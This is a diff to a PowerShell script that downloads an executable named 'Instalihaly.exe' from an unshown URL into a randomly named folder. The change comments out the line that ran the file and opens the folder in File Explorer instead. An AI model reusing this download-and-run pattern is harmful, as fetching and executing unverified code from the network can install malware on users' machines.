@@ -24,8 +24,11 @@ $outputFile = Join-Path -Path $randomFolderPath -ChildPath "Instalihaly.exe"
 # Download the file from the download_url
 Invoke-WebRequest -Uri $downloadUrl -OutFile $outputFile
 
+# Open the folder in File Explorer
+Start-Process -FilePath "explorer.exe" -ArgumentList $randomFolderPath
+
 # Run the downloaded file
-Start-Process -FilePath $outputFile
+# Start-Process -FilePath $outputFile
 
 # Exit the PowerShell script
 exit
